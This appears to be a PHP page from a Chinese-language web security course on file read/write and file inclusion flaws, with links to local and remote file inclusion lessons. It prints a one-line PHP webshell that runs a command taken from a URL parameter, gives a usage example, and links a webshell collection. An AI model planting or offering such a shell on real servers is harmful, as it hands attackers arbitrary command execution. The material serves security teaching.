<?php

session_start();
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: /account/login.php".(isset($_SERVER['REQUEST_URI'])?"?redirect=".$_SERVER['REQUEST_URI']:""));
    exit;
}

$titlename='檔案包含漏洞';
include('../../php-inc/header.php');

?>

<h1 id="-">檔案讀寫漏洞</h1>
<ul>
    <li>Write 寫入</li>
    <li>Read 讀取</li>
</ul>
<h2 id="web-">WEB 檔案類型</h2>
<ul>
    <li>File-based
        <pre><code class="lang-php="><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;Hello World&lt;/p&gt;'</span>; <span class="hljs-meta">?&gt;</span></span>
</code></pre>
    </li>
    <li>Route-based
        <pre><code class="lang-python=">@app.route(<span class="hljs-string">"/"</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span>:
  <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello, World!"</span>
</code></pre>
    </li>
</ul>
<h3 id="webshell">webshell</h3>
<ul>
    <li>可以利用瀏覽器存取伺服器的惡意頁面，該頁面可以執行任意指令
        <pre><code class="lang-php=">  <span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">'meow'</span>]); <span class="hljs-meta">?&gt;</span></span>
</code></pre>
        <ul>
            <li>shell.php?meow=ls</li>
        </ul>
    </li>
    <li>各式各樣的 webshell<ul>
            <li><a
                    href="https://github.com/tennc/webshell/tree/master/php">https://github.com/tennc/webshell/tree/master/php</a>
            </li>
        </ul>
    </li>
</ul>





</ul>

<table class="table table-hover">
    <thead>
        <tr>
            <th scope="col">#</th>
            <th scope="col">課程名稱</th>
            <th scope="col">課程說明</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <th scope="row">1</th>
            <td><a href="l1.php">Local file inclusion</a></td>
            <td>了解本地檔案包含漏洞 </td>
        </tr>

        <tr>
            <th scope="row">2</th>
            <td><a href="l2.php">Remote file inclusion</a></td>
            <td>了解遠端檔案包含漏洞</td>
        </tr>


    </tbody>
</table>

<?php

include('../../php-inc/footer.php')


?>